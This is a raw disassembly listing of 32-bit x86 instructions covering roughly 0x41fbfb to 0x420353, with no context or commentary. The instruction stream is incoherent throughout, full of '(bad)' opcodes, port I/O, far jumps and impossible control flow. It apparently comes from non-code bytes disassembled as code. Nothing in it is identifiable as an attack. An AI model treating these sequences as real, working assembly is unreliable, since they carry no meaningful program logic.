  41fbfb:	(bad)  
  41fbfc:	jns    0x41fc77
  41fbfe:	mov    ds:0xc39ba70,eax
  41fc03:	test   al,0x4c
  41fc05:	xor    ah,BYTE PTR ds:0x9e40f5cd
  41fc0b:	push   es
  41fc0c:	inc    ebx
  41fc0d:	inc    esi
  41fc0e:	in     eax,0x2c
  41fc10:	not    DWORD PTR [edi-0x1251e2f7]
  41fc16:	mov    al,ds:0x174847e6
  41fc1b:	repz and eax,0xf9a98d11
  41fc21:	popa   
  41fc22:	rcl    BYTE PTR cs:[edx],cl
  41fc25:	je     0x41fbd2
  41fc27:	scas   eax,DWORD PTR es:[edi]
  41fc28:	sbb    BYTE PTR [esi+0x4d],dl
  41fc2b:	xchg   esp,eax
  41fc2c:	data16 mov dl,0xa8
  41fc2f:	mov    bl,0xff
  41fc31:	adc    BYTE PTR [ecx],0x7a
  41fc34:	inc    ebp
  41fc35:	pop    eax
  41fc36:	pop    eax
  41fc37:	jle    0x41fc94
  41fc39:	ins    DWORD PTR es:[edi],dx
  41fc3a:	pop    eax
  41fc3b:	mov    ch,0x6e
  41fc3d:	sar    ecx,1
  41fc3f:	daa    
  41fc40:	sbb    dl,BYTE PTR [ecx-0x4a]
  41fc43:	push   0x47
  41fc45:	mov    ebp,0x79da211f
  41fc4a:	test   DWORD PTR [ecx+0x33],0xa3627f0e
  41fc51:	mov    al,0xb6
  41fc53:	or     edi,DWORD PTR [edx-0x1597b76e]
  41fc59:	xor    ebx,DWORD PTR [edx-0x5b]
  41fc5c:	bound  ebp,QWORD PTR [ebx-0x43cc6913]
  41fc62:	sahf   
  41fc63:	push   ecx
  41fc64:	push   esp
  41fc65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc66:	stos   DWORD PTR es:[edi],eax
  41fc67:	out    0x16,al
  41fc69:	cmp    al,cl
  41fc6b:	repnz mov eax,DWORD PTR [esi-0x9]
  41fc6f:	mov    edx,0x55857d27
  41fc74:	faddp  st(2),st
  41fc76:	cmp    BYTE PTR [ebx],0xc
  41fc79:	bound  ebp,QWORD PTR [esi+ecx*8-0x6e]
  41fc7d:	outs   dx,BYTE PTR ds:[esi]
  41fc7e:	adc    al,0x18
  41fc80:	fldcw  WORD PTR [ecx]
  41fc82:	sub    BYTE PTR [edi+0x100576e8],bh
  41fc88:	daa    
  41fc89:	out    0xb5,eax
  41fc8b:	in     eax,dx
  41fc8c:	xchg   ebp,eax
  41fc8d:	leave  
  41fc8e:	lods   al,BYTE PTR ds:[esi]
  41fc90:	das    
  41fc91:	push   ds
  41fc92:	or     BYTE PTR [ebp+edi*1+0x20],ah
  41fc96:	and    ecx,esp
  41fc98:	xlat   BYTE PTR ds:[ebx]
  41fc99:	fisub  DWORD PTR [edi+0x1b64b6a9]
  41fc9f:	pop    edi
  41fca0:	or     al,0xdd
  41fca2:	outs   dx,DWORD PTR ds:[esi]
  41fca3:	xchg   ebp,eax
  41fca4:	jae    0x41fc36
  41fca6:	xchg   DWORD PTR [esi],ebp
  41fca8:	ss and al,0x61
  41fcab:	idiv   DWORD PTR [edi]
  41fcad:	inc    ebx
  41fcae:	add    al,0xa8
  41fcb0:	outs   dx,DWORD PTR ds:[esi]
  41fcb1:	sbb    eax,0x1d76cc11
  41fcb6:	lock daa 
  41fcb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fcb9:	mov    al,ds:0x6e4285f3
  41fcbe:	mov    esi,0x3fa198d3
  41fcc3:	mov    al,ds:0x533d522a
  41fcc8:	outs   dx,BYTE PTR ds:[esi]
  41fcc9:	loope  0x41fca6
  41fccb:	inc    esp
  41fccc:	clc    
  41fccd:	jno    0x41fd3d
  41fccf:	(bad)  
  41fcd0:	bound  edi,QWORD PTR [edx-0x2659a3de]
  41fcd6:	cmp    edx,DWORD PTR [ecx+0x446bc7be]
  41fcdc:	stos   BYTE PTR es:[edi],al
  41fcdd:	mov    ebp,0xb1109f2f
  41fce2:	int3   
  41fce3:	or     DWORD PTR [edx-0x92694fe],ecx
  41fce9:	pop    eax
  41fcea:	stos   DWORD PTR es:[edi],eax
  41fceb:	fnstsw WORD PTR [eax+ebp*1]
  41fcee:	or     al,0x29
  41fcf0:	jns    0x41fd09
  41fcf2:	pushf  
  41fcf3:	fist   WORD PTR [esi+0x12]
  41fcf6:	iret   
  41fcf7:	xor    edx,DWORD PTR [esi+0x47]
  41fcfa:	data16 xor BYTE PTR [ecx+0x10],bh
  41fcfe:	js     0x41fd66
  41fd00:	inc    ecx
  41fd01:	xchg   esi,eax
  41fd02:	cli    
  41fd03:	out    0x7a,al
  41fd05:	jne    0x41fcb8
  41fd07:	cli    
  41fd08:	pop    ss
  41fd09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd0a:	out    0xc4,al
  41fd0c:	data16 outs dx,BYTE PTR ds:[esi]
  41fd0e:	test   BYTE PTR [ebp-0x2465101],cl
  41fd14:	xor    DWORD PTR [edx],esi
  41fd16:	rcr    DWORD PTR [edi],cl
  41fd18:	mov    ds:0x9ee26ab9,eax
  41fd1d:	xor    DWORD PTR [eax+0x55325d09],edi
  41fd23:	fidivr DWORD PTR [edx+edi*4]
  41fd26:	mov    ds:0x7c499df7,eax
  41fd2b:	sub    BYTE PTR [edx],cl
  41fd2d:	inc    ecx
  41fd2e:	stos   BYTE PTR es:[edi],al
  41fd2f:	add    DWORD PTR [eax+ecx*2+0x20],esp
  41fd33:	and    ecx,DWORD PTR [ebx+0x38112904]
  41fd39:	pop    esp
  41fd3a:	stc    
  41fd3b:	clc    
  41fd3c:	dec    esp
  41fd3d:	push   ss
  41fd3e:	mov    ecx,0x78ff29b4
  41fd43:	popa   
  41fd44:	icebp  
  41fd45:	mov    ds:0xf4a44c96,eax
  41fd4a:	add    DWORD PTR [edi],edx
  41fd4c:	ss mov bl,0x52
  41fd4f:	call   0x7dc:0x48e95a9b
  41fd56:	cli    
  41fd57:	ss xchg ecx,eax
  41fd59:	xchg   edx,eax
  41fd5a:	or     al,0xee
  41fd5c:	ror    BYTE PTR [eax+0x3208b3d3],cl
  41fd62:	push   esp
  41fd63:	mov    al,0xd
  41fd65:	in     al,dx
  41fd66:	std    
  41fd67:	add    ah,BYTE PTR [esi]
  41fd69:	pop    eax
  41fd6a:	inc    edx
  41fd6b:	nop
  41fd6c:	ficomp DWORD PTR [edx+edi*2+0x2f]
  41fd70:	xchg   edi,eax
  41fd71:	adc    al,0x92
  41fd73:	out    dx,eax
  41fd74:	push   cs
  41fd75:	adc    ah,al
  41fd77:	inc    ebp
  41fd78:	jne    0x41fd84
  41fd7a:	je     0x41fda8
  41fd7c:	dec    ebx
  41fd7d:	push   ebx
  41fd7e:	and    eax,0xa2eeedc2
  41fd83:	mov    ebx,0x1da28025
  41fd88:	fcmovb st,st(0)
  41fd8a:	fdivp  st(4),st
  41fd8c:	or     DWORD PTR [edi+0x33e017da],ebx
  41fd92:	(bad)  
  41fd93:	frstor [ebp-0x7501b910]
  41fd99:	mov    al,0xae
  41fd9b:	loopne 0x41fe04
  41fd9d:	mov    edi,esi
  41fd9f:	(bad)  
  41fda1:	sbb    BYTE PTR [edi],0x62
  41fda4:	rcr    DWORD PTR [edx],cl
  41fda6:	cmp    DWORD PTR [edi-0x5d],0xffffffe9
  41fdaa:	call   0x54288b35
  41fdaf:	xchg   ebx,eax
  41fdb0:	ret    0xaef5
  41fdb3:	add    eax,DWORD PTR [eax+esi*2+0x16f84188]
  41fdba:	scas   al,BYTE PTR es:[edi]
  41fdbb:	mov    ecx,0x277d3048
  41fdc0:	sub    dh,bh
  41fdc2:	rcr    BYTE PTR [ebp+0x3662111f],0x95
  41fdc9:	push   ebx
  41fdca:	mov    ecx,0x34e85627
  41fdcf:	std    
  41fdd0:	push   ebx
  41fdd1:	sbb    BYTE PTR [ecx+0x7c],dl
  41fdd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdd5:	(bad)  
  41fdd6:	cmp    eax,0x6663258b
  41fddb:	lods   al,BYTE PTR ds:[esi]
  41fddc:	and    ebp,ebp
  41fdde:	sbb    bl,dl
  41fde0:	std    
  41fde1:	adc    DWORD PTR [eax+ebp*1],esp
  41fde4:	shl    BYTE PTR [esp+ebp*1+0x63],0xd6
  41fde9:	stos   BYTE PTR es:[edi],al
  41fdea:	mov    ebp,0xd9209e03
  41fdef:	push   esi
  41fdf0:	(bad)  
  41fdf1:	mov    ebx,0x254e3468
  41fdf6:	(bad)  
  41fdf7:	bound  ecx,QWORD PTR [ebx+0x73853220]
  41fdfd:	aam    0x6d
  41fdff:	cmp    eax,0x7822a049
  41fe04:	(bad)
  41fe07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe08:	ficom  WORD PTR [edi]
  41fe0a:	sbb    eax,0x675e0de1
  41fe0f:	add    eax,DWORD PTR [esi]
  41fe11:	add    bh,BYTE PTR [edi-0x9036c67]
  41fe17:	aas    
  41fe18:	xchg   ebx,eax
  41fe19:	fiadd  WORD PTR [ebp+0x7]
  41fe1c:	adc    DWORD PTR [eax+0x7caf6cc0],ecx
  41fe22:	inc    ecx
  41fe23:	setbe  BYTE PTR [ebx]
  41fe26:	mov    ebx,0xa425195d
  41fe2b:	sbb    eax,DWORD PTR [edx+0x62a7b8e3]
  41fe31:	mov    eax,0xa62dc3ee
  41fe36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe37:	pop    ebx
  41fe38:	and    al,0xd7
  41fe3a:	sbb    dl,BYTE PTR [eax-0x38]
  41fe3d:	sar    DWORD PTR [eax],0xcf
  41fe40:	enter  0xb9cb,0xc3
  41fe44:	mov    esp,0xe1493bae
  41fe49:	jmp    0xd9e4:0xff1548fc
  41fe50:	dec    ebx
  41fe51:	push   eax
  41fe52:	mov    ecx,0x69bda1dd
  41fe57:	xor    al,0x90
  41fe59:	lods   eax,DWORD PTR ds:[esi]
  41fe5a:	aad    0x8e
  41fe5c:	xchg   esi,eax
  41fe5d:	test   DWORD PTR [edi+0x61],esp
  41fe60:	inc    ebp
  41fe61:	das    
  41fe62:	dec    esi
  41fe63:	int3   
  41fe64:	ror    esp,1
  41fe66:	loopne 0x41fe99
  41fe68:	mov    esp,0x2a66701
  41fe6d:	les    edi,FWORD PTR [ebx+0x59]
  41fe70:	test   BYTE PTR [ebp-0x2ea8749b],ah
  41fe76:	xor    DWORD PTR [esi+0xa],edx
  41fe79:	mov    ah,BYTE PTR [esi-0x59]
  41fe7c:	dec    esp
  41fe7d:	cmc    
  41fe7e:	mov    al,0xa5
  41fe80:	sub    esp,ecx
  41fe82:	push   ebp
  41fe83:	enter  0xa9cf,0xd2
  41fe87:	and    al,0xbb
  41fe89:	data16 sbb dh,BYTE PTR [esi+0x21106861]
  41fe90:	push   cs
  41fe91:	loope  0x41fede
  41fe93:	pop    ecx
  41fe94:	(bad)  
  41fe95:	mov    esi,0xf8d2ca2e
  41fe9a:	cmp    BYTE PTR [ecx+eax*8],bl
  41fe9d:	mov    ebx,0x162067a7
  41fea2:	mov    ebp,0x68dc0017
  41fea7:	push   ebx
  41fea8:	js     0x41fe99
  41feaa:	retf   0x906e
  41fead:	stos   BYTE PTR es:[edi],al
  41feae:	fild   DWORD PTR [edi+0x16]
  41feb1:	adc    esp,DWORD PTR [ebx-0x7073f487]
  41feb7:	inc    eax
  41feb8:	push   esp
  41feb9:	mov    ebp,0xc1015522
  41febe:	xchg   edx,eax
  41febf:	scas   al,BYTE PTR es:[edi]
  41fec0:	jmp    0x41fe63
  41fec2:	repnz pop edx
  41fec4:	mov    bh,0xd3
  41fec6:	js     0x41fef5
  41fec8:	arpl   WORD PTR [eax-0x1b],ax
  41fecb:	dec    edi
  41fecc:	mov    cl,0xdd
  41fece:	mov    ch,0x1
  41fed0:	jne    0x41ff15
  41fed2:	sub    cl,BYTE PTR [ecx-0x15992093]
  41fed8:	jmp    0x73704b07
  41fedd:	push   ebp
  41fede:	retf   0xf8d3
  41fee1:	add    eax,0x3c858694
  41fee6:	aas    
  41fee7:	into   
  41fee8:	push   edx
  41fee9:	aaa    
  41feea:	(bad)  
  41feeb:	out    0xaf,al
  41feed:	and    al,0xc2
  41feef:	ja     0x41ff60
  41fef1:	inc    ebp
  41fef2:	rcr    DWORD PTR [esi-0x71],0xdd
  41fef6:	inc    ebp
  41fef7:	mov    fs,esi
  41fef9:	jnp    0x41ff1d
  41fefb:	rcr    ecx,0x3a
  41fefe:	mov    esi,0xa25c7dc4
  41ff03:	retf   0xbd7f
  41ff06:	mov    DWORD PTR [ebx+edi*8+0x66],esp
  41ff0a:	or     BYTE PTR [ecx-0x37],ah
  41ff0d:	retf   
  41ff0e:	sbb    DWORD PTR [eax-0x3e],0x4712939a
  41ff15:	push   ss
  41ff16:	sbb    DWORD PTR [ebx+0x54438ba2],ebx
  41ff1c:	setbe  BYTE PTR [esi]
  41ff1f:	imul   cl
  41ff21:	xor    dh,BYTE PTR [ebp+0x23]
  41ff24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff25:	loopne 0x41ff9c
  41ff27:	dec    edi
  41ff28:	push   esi
  41ff29:	fsubr  DWORD PTR [edi+0x1d]
  41ff2c:	push   edi
  41ff2d:	mov    ?,WORD PTR [esi+0x6a]
  41ff30:	inc    ecx
  41ff31:	inc    eax
  41ff32:	leave  
  41ff33:	into   
  41ff34:	add    al,0x44
  41ff36:	dec    esi
  41ff37:	mov    cs,WORD PTR es:[ecx-0x3e4c2d28]
  41ff3e:	lods   al,BYTE PTR fs:[esi]
  41ff40:	sub    eax,0xe7577bda
  41ff45:	test   BYTE PTR [edx-0x2f],ch
  41ff48:	inc    dl
  41ff4a:	push   cs
  41ff4b:	(bad)  
  41ff4c:	enter  0x7584,0xaf
  41ff50:	adc    ebx,0xd2a256d2
  41ff56:	lahf   
  41ff57:	das    
  41ff58:	jne    0x41ffb3
  41ff5a:	jo     0x41ff64
  41ff5c:	jns    0x41ffad
  41ff5e:	leave  
  41ff5f:	and    eax,0x63f4ed23
  41ff64:	fimul  WORD PTR [edx+eax*2]
  41ff67:	cmp    BYTE PTR es:[edi-0x46],cl
  41ff6b:	cmp    ebp,DWORD PTR gs:[edi]
  41ff6e:	mov    dl,cl
  41ff70:	or     ch,bh
  41ff72:	(bad)  
  41ff73:	stc    
  41ff74:	test   BYTE PTR [edx],bh
  41ff76:	lods   eax,DWORD PTR ds:[esi]
  41ff77:	mov    esi,0x28d6ae45
  41ff7c:	lahf   
  41ff7d:	leave  
  41ff7e:	mov    edx,0x3bcacd9a
  41ff83:	stos   DWORD PTR es:[edi],eax
  41ff84:	ret    
  41ff85:	cmp    eax,DWORD PTR [esi]
  41ff87:	inc    ebx
  41ff88:	in     eax,dx
  41ff89:	jp     0x41ff82
  41ff8b:	mov    ah,0x21
  41ff8d:	push   eax
  41ff8e:	popf   
  41ff8f:	or     eax,0x9e9122bb
  41ff94:	fisttp DWORD PTR [edx-0x4ee4f8ae]
  41ff9a:	jns    0x41ffec
  41ff9c:	dec    edi
  41ff9d:	push   edx
  41ff9e:	pop    es
  41ff9f:	cmc    
  41ffa0:	sbb    eax,0xa534ad94
  41ffa5:	mov    cl,0x14
  41ffa7:	fld    QWORD PTR [edx-0x6bfbc0c6]
  41ffad:	clc    
  41ffae:	lea    eax,[edi]
  41ffb0:	scas   eax,DWORD PTR es:[edi]
  41ffb1:	xor    BYTE PTR [ecx-0xe],cl
  41ffb4:	fisttp WORD PTR [eax+ecx*1+0x246ca9c7]
  41ffbb:	shl    DWORD PTR [edi],1
  41ffbd:	push   edi
  41ffbe:	push   edi
  41ffbf:	test   BYTE PTR [esi-0x2fae68fc],dl
  41ffc5:	add    al,0x4a
  41ffc7:	rcr    BYTE PTR ds:0x12f584ca,1
  41ffcd:	and    dh,cl
  41ffcf:	push   esi
  41ffd0:	ins    BYTE PTR es:[edi],dx
  41ffd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffd2:	mov    dh,0x21
  41ffd4:	jecxz  0x42002e
  41ffd6:	or     eax,0x33d40694
  41ffdb:	cmp    DWORD PTR [ecx],ecx
  41ffdd:	push   es
  41ffde:	cwde   
  41ffdf:	ss das 
  41ffe1:	lods   al,BYTE PTR ds:[esi]
  41ffe2:	fbstp  TBYTE PTR [eax]
  41ffe4:	add    al,0x41
  41ffe6:	mov    ecx,0xa5c2ea44
  41ffeb:	add    ebx,ecx
  41ffed:	fimul  DWORD PTR [esp+eiz*8+0x33]
  41fff1:	call   0x1aeb975c
  41fff6:	or     DWORD PTR [edi],edi
  41fff8:	cmp    al,0x4c
  41fffa:	aaa    
  41fffb:	(bad)  
  41fffd:	ja     0x420063
  41ffff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420000:	test   ecx,esi
  420002:	push   eax
  420003:	pop    edi
  420004:	stc    
  420005:	jge    0x42000b
  420007:	cmp    bl,cl
  420009:	out    0x7f,eax
  42000b:	in     al,dx
  42000c:	xchg   ebx,eax
  42000d:	(bad)  
  42000e:	retf   
  42000f:	retf   0xcf6f
  420012:	iret   
  420013:	jmp    0x5b60:0x2146a583
  42001a:	retf   
  42001b:	pop    ebx
  42001c:	push   esp
  42001d:	and    ecx,DWORD PTR [ecx+0x70]
  420020:	adc    eax,0x9a942c72
  420025:	xlat   BYTE PTR ds:[ebx]
  420026:	sbb    al,0x5f
  420028:	std    
  420029:	push   ebp
  42002a:	ins    BYTE PTR es:[edi],dx
  42002b:	mov    edx,0xdd8ebff2
  420030:	into   
  420031:	jmp    0x4200ae
  420033:	push   ss
  420034:	sub    edx,DWORD PTR [edx+0x69]
  420037:	and    eax,0xb193b8d1
  42003c:	inc    edi
  42003d:	mov    esi,0xce3e9327
  420042:	jg     0x4200b1
  420044:	push   cs
  420045:	ins    DWORD PTR es:[edi],dx
  420046:	mov    ebx,0xd81bf419
  42004b:	adc    al,0x73
  42004d:	fisttp QWORD PTR [edx-0x49]
  420050:	dec    edi
  420051:	mov    al,ds:0x93da52c0
  420056:	and    ah,BYTE PTR [edx+0x5f]
  420059:	jno    0x41ffe9
  42005b:	xchg   esp,eax
  42005c:	pop    ds
  42005d:	test   eax,0x1fe368a5
  420062:	dec    ebp
  420063:	sbb    BYTE PTR [ebx+ebx*8+0xc],0x6a
  420068:	lds    edi,FWORD PTR [edi+esi*8-0x2d]
  42006c:	enter  0x6075,0x4e
  420070:	lea    esi,[edi+0x45]
  420073:	push   es
  420074:	add    BYTE PTR [edi*2+0x385c66bb],cl
  42007b:	pushf  
  42007c:	mov    bl,0x3c
  42007e:	cmp    al,0x39
  420080:	mov    ah,0xfa
  420082:	arpl   WORD PTR [ebx],sp
  420084:	icebp  
  420085:	fsubr  QWORD PTR [edx-0x78]
  420088:	jb     0x420043
  42008a:	les    ebp,FWORD PTR [esi+0x7]
  42008d:	inc    ebx
  42008e:	fild   WORD PTR [eax-0x8]
  420091:	(bad)  [ecx+0xf]
  420094:	or     bh,ah
  420096:	push   eax
  420097:	loop   0x4200ea
  420099:	jb     0x4200bb
  42009b:	out    dx,eax
  42009c:	pop    ss
  42009d:	cmp    al,0xb1
  42009f:	aaa    
  4200a0:	mov    ah,0xf4
  4200a2:	(bad)  
  4200a3:	cmp    DWORD PTR [eax-0x50],0xa7b1f529
  4200aa:	sub    dl,al
  4200ac:	push   ss
  4200ad:	(bad)  
  4200ae:	call   0xf8dcf7de
  4200b3:	or     eax,0xf8af082a
  4200b8:	lods   al,BYTE PTR ds:[esi]
  4200b9:	rol    DWORD PTR [eax+0x45bd3f2e],0xd3
  4200c0:	or     dh,BYTE PTR [ecx-0x7ba4ff89]
  4200c6:	xlat   BYTE PTR ds:[ebx]
  4200c7:	nop
  4200c8:	int3   
  4200c9:	repz jmp 0xf174:0xd0568738
  4200d1:	cdq    
  4200d2:	jp     0x42010a
  4200d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200d5:	(bad)  
  4200d6:	pop    eax
  4200d7:	stos   DWORD PTR es:[edi],eax
  4200d8:	jno    0x42014b
  4200da:	mov    ebx,0x780944e3
  4200df:	dec    ebp
  4200e0:	push   eax
  4200e1:	xor    al,0x8d
  4200e3:	sub    ebp,esp
  4200e5:	int    0x5e
  4200e7:	(bad)  
  4200e8:	jno    0x4200fb
  4200ea:	stos   DWORD PTR es:[edi],eax
  4200eb:	(bad)  
  4200ec:	mul    BYTE PTR [edx+edi*8-0x37]
  4200f0:	cmp    ecx,DWORD PTR [edi-0x31]
  4200f3:	mov    edi,0x65f101e
  4200f8:	cmp    DWORD PTR [edx],ebp
  4200fa:	cdq    
  4200fb:	(bad)  
  4200fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200fd:	nop
  4200fe:	jle    0x420146
  420100:	cmp    al,0xee
  420102:	cdq    
  420103:	mov    esi,0x951df7ce
  420108:	mov    ds:0xf5bfc3dc,eax
  42010d:	inc    edx
  42010e:	push   ecx
  42010f:	mov    eax,ds:0x1bb656d3
  420114:	sbb    BYTE PTR [ecx+0x5a],dh
  420117:	xchg   esi,eax
  420118:	je     0x420141
  42011a:	daa    
  42011b:	add    ebp,DWORD PTR [edi+ebx*2]
  42011e:	in     al,0xc
  420120:	mov    eax,ebp
  420122:	std    
  420123:	add    BYTE PTR [ebx],dh
  420125:	inc    esp
  420126:	or     DWORD PTR [edi-0x2f],ecx
  420129:	mov    esi,0x34906dda
  42012e:	mov    al,0x63
  420130:	sbb    edx,edx
  420132:	gs push es
  420134:	cmp    al,BYTE PTR [ecx-0x7a]
  420137:	jne    0x4200bc
  420139:	in     eax,0x86
  42013b:	sti    
  42013c:	pop    ds
  42013d:	mov    eax,0x2d60a32d
  420142:	mov    ebp,0x2953287d
  420147:	es cdq 
  420149:	stos   BYTE PTR es:[edi],al
  42014a:	inc    ebp
  42014b:	rcr    eax,0xe2
  42014e:	inc    ebx
  42014f:	in     eax,0xba
  420151:	imul   edx,DWORD PTR [ecx+ebp*4],0x3c
  420155:	jge    0x4201b9
  420157:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420158:	push   ds
  420159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42015a:	mov    ecx,0x3fb7aa8d
  42015f:	retf   0x8ad2
  420162:	pop    esp
  420163:	pop    ebp
  420164:	retf   
  420165:	rol    DWORD PTR [edx+0x21],1
  420168:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420169:	push   eax
  42016a:	pushf  
  42016b:	aaa    
  42016c:	sub    ch,bh
  42016e:	pusha  
  42016f:	jle    0x4201c5
  420171:	mov    esi,ebx
  420173:	fisub  WORD PTR [ecx+0x27f60a9a]
  420179:	xchg   al,bl
  42017b:	into   
  42017c:	xchg   ecx,eax
  42017d:	mov    esi,0xb157e7ea
  420182:	jne    0x42017d
  420184:	rcl    DWORD PTR [edi],cl
  420186:	jl     0x4201ca
  420188:	sbb    al,0x41
  42018a:	sbb    DWORD PTR [edi+0x41],ebp
  42018d:	xor    eax,0xb8fb5cab
  420192:	mov    dl,0x74
  420194:	dec    ebx
  420195:	cmp    DWORD PTR [ebx+edi*1-0x1fed49a7],ebx
  42019c:	in     al,0x4d
  42019e:	mov    ds:0x85cac51a,eax
  4201a3:	inc    ebx
  4201a4:	pusha  
  4201a5:	jne    0x4201e4
  4201a7:	gs (bad) 
  4201aa:	jmp    0xeb81:0x474462f1
  4201b1:	adc    BYTE PTR [esi],al
  4201b3:	aas    
  4201b4:	jns    0x420177
  4201b6:	mov    dh,0x52
  4201b8:	cmp    ah,BYTE PTR [edi-0x7e]
  4201bb:	mov    dl,bh
  4201bd:	cld    
  4201be:	push   0x0
  4201c0:	js     0x42021c
  4201c2:	test   BYTE PTR [esi+0x39],dh
  4201c5:	xchg   ebp,eax
  4201c6:	jmp    0xd04c4388
  4201cb:	or     DWORD PTR [eax-0x30],ebx
  4201ce:	jl     0x420171
  4201d0:	aam    0x59
  4201d2:	stos   BYTE PTR es:[edi],al
  4201d3:	out    0x43,eax
  4201d5:	stos   DWORD PTR es:[edi],eax
  4201d6:	push   0xffffffcc
  4201d8:	mov    DWORD PTR [esi],0x7123a9f8
  4201de:	(bad)  
  4201df:	aad    0xf7
  4201e1:	adc    BYTE PTR [esi+esi*8+0x39e4b3f8],cl
  4201e8:	les    eax,FWORD PTR [edx]
  4201ea:	outs   dx,DWORD PTR ds:[esi]
  4201eb:	push   0x3b
  4201ed:	repz sbb BYTE PTR [esi+0x36139f23],dl
  4201f4:	dec    eax
  4201f5:	inc    esi
  4201f6:	mov    ds:0xa882f600,al
  4201fb:	jecxz  0x42019d
  4201fd:	pop    eax
  4201fe:	fidiv  WORD PTR [ebp*4+0x23464f80]
  420205:	xchg   edx,eax
  420206:	imul   ebx,DWORD PTR [ebp-0x15],0x7aafae5
  42020d:	push   ecx
  42020e:	jp     0x42024a
  420210:	std    
  420211:	jb     0x4201ec
  420213:	popf   
  420214:	mov    esi,0xb1f87b25
  420219:	ss sub eax,esp
  42021c:	adc    al,0x3a
  42021e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42021f:	add    al,BYTE PTR [eax-0x3c]
  420222:	mov    ecx,0x5c9c347
  420227:	outs   dx,BYTE PTR ds:[esi]
  420228:	jecxz  0x4201d5
  42022a:	and    al,0x62
  42022c:	and    BYTE PTR [ebx-0x5d],cl
  42022f:	iret   
  420230:	(bad)  
  420231:	dec    ebp
  420232:	rcr    cl,cl
  420234:	adc    DWORD PTR [ebx-0x1a],0xffffffa6
  420238:	fldenv [esi-0xa]
  42023b:	in     eax,0x7c
  42023d:	lahf   
  42023e:	fsubr  DWORD PTR [edi+0x7d30527f]
  420244:	xchg   ebx,eax
  420245:	cs mov edx,0x806b9bf1
  42024b:	pop    ebx
  42024c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42024d:	xor    DWORD PTR [esi-0x3206ffe2],esp
  420253:	sub    al,0xcc
  420255:	mov    DWORD PTR [ebx-0x3143f6f6],edi
  42025b:	dec    edi
  42025c:	sub    DWORD PTR [edi-0x32],ebp
  42025f:	xchg   ebp,eax
  420260:	jl     0x9fcd0868
  420266:	cmc    
  420267:	ins    DWORD PTR es:[edi],dx
  420268:	ins    BYTE PTR es:[edi],dx
  420269:	xor    al,0xc4
  42026b:	pop    edi
  42026c:	out    0xaf,al
  42026e:	xchg   esi,eax
  42026f:	popf   
  420270:	push   0xfb176a5f
  420275:	cmp    DWORD PTR [ebx-0x2d1e6d4d],esp
  42027b:	aas    
  42027c:	inc    eax
  42027d:	cmp    dh,dh
  42027f:	xchg   ebx,eax
  420280:	add    eax,0x8efe6fd4
  420285:	retf   
  420286:	cmc    
  420287:	int3   
  420288:	in     al,0xea
  42028a:	ror    BYTE PTR [edx-0x53],cl
  42028d:	test   eax,0x904d206b
  420292:	gs imul DWORD PTR gs:[ebx+0x0]
  420297:	adc    DWORD PTR [ebx+0x45],ebx
  42029a:	in     eax,dx
  42029b:	ins    BYTE PTR es:[edi],dx
  42029c:	out    dx,eax
  42029d:	xor    DWORD PTR [eax+0x108521cf],esi
  4202a3:	and    BYTE PTR [ecx+0x5a6e4f2d],0xee
  4202aa:	aaa    
  4202ab:	iret   
  4202ac:	or     eax,0xdcf1b772
  4202b1:	sub    eax,0xf8aa3b8a
  4202b6:	mov    eax,0x642c9f69
  4202bb:	aaa    
  4202bc:	push   ebx
  4202bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202be:	push   es
  4202bf:	shl    DWORD PTR [ecx-0xd],0xe2
  4202c3:	jp     0x42027f
  4202c5:	xor    esi,DWORD PTR [ebx-0x13]
  4202c8:	stos   BYTE PTR es:[edi],al
  4202c9:	popa   
  4202ca:	mov    dh,0xfe
  4202cc:	fdivr  QWORD PTR [edi]
  4202ce:	sahf   
  4202cf:	xor    eax,0xa1038677
  4202d4:	inc    edi
  4202d5:	xlat   BYTE PTR ds:[ebx]
  4202d6:	mov    ds:0x87a7cde2,eax
  4202db:	sbb    eax,0x4cc734ad
  4202e0:	mov    bl,0x2c
  4202e2:	lea    esp,[ecx+0x55a5f41]
  4202e8:	loop   0x420305
  4202ea:	xchg   BYTE PTR [edi],al
  4202ec:	call   0x30e7:0xea8c1005
  4202f3:	inc    ebp
  4202f4:	test   eax,0x45bdb9fa
  4202f9:	push   edx
  4202fa:	xlat   BYTE PTR ds:[ebx]
  4202fb:	ja     0x420324
  4202fd:	test   eax,0xbff998f7
  420302:	cmp    eax,0xf7dee4bc
  420307:	pop    esi
  420308:	and    DWORD PTR [ebp+ebx*4-0x44],ecx
  42030c:	mov    ebx,0x35df2bc
  420311:	mov    ebp,0xd1fcd111
  420316:	sbb    BYTE PTR [ebx-0x24],0xf
  42031a:	icebp  
  42031b:	outs   dx,BYTE PTR ds:[esi]
  42031c:	mov    al,0xf7
  42031e:	(bad)  
  42031f:	loopne 0x4202be
  420321:	shl    DWORD PTR [esp+ecx*4],1
  420324:	or     eax,ebx
  420326:	fwait
  420327:	dec    ebp
  420328:	xor    BYTE PTR [edx+0xc],0x2b
  42032c:	xlat   BYTE PTR ds:[ebx]
  42032d:	repnz mov al,ds:0x71920c94
  420333:	pop    ebp
  420334:	test   BYTE PTR [esi-0x49],dh
  420337:	xchg   edi,eax
  420338:	sar    DWORD PTR [ebp+ecx*4+0x5c],1
  42033c:	mov    DWORD PTR [ebp+ebp*4+0x772e595c],0x5c90cb91
  420347:	add    BYTE PTR [ebx-0x79],0x1f
  42034b:	xchg   edi,eax
  42034c:	les    ecx,FWORD PTR [edx+0x17]
  42034f:	cdq    
  420350:	sub    al,0xda
  420352:	dec    edi
  420353:	or     eax,0xb9884b5a
